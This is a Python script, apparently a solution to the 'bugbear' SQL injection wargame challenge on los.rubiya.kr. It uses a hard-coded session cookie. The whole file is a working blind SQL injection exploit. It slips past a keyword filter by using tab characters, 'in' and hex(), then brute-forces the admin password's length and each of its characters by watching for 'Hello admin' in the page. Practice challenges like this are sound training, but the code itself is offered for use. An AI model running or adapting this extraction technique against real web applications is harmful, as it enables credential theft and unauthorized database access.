
import requests

url = "https://los.rubiya.kr/chall/bugbear_19ebf8c8106a5323825b5dfa1b07ac1f.php?"
passid =  {'PHPSESSID': 'd390gv8lirld82i5opc2qapa7u'}
flag = ""
pwl=1

print("------- FIND LENGTH -------")

for i in range(0, 50):
    try:
        query = f"{url}no=1%09||%09id%09in%09(\"admin\")%09%26%26%09length(pw)%09in%09({i})%23"
        r = requests.post(query, cookies=passid)
    except:
        print ("---- Error ----")
        continue
    if 'Hello admin' in r.text:
        pwl= i
        print("Found length! [",pwl,"]")
        break
    print("FINDING LENGTH... " , i)

print("------- FIND PASSWORD -------")

for pw_value in range(1,pwl+1):
  print(pw_value,"# FINDING PASSWORD... ")
  for ascii in range(48,128):
      try:
          value = url + 'no=1%09||%09id%09in%09("admin")%26%26hex(mid(pw,{},1))%09in%09(hex({}))'.format(pw_value,ascii)
          response = requests.post(value,cookies=passid)
      except:
          print("---- Error ----")
          continue
      if 'Hello admin' in response.text:
        flag+=chr(ascii)
        print("Found password! [",flag,"]")
        break
print("Complete! pw : ",flag)

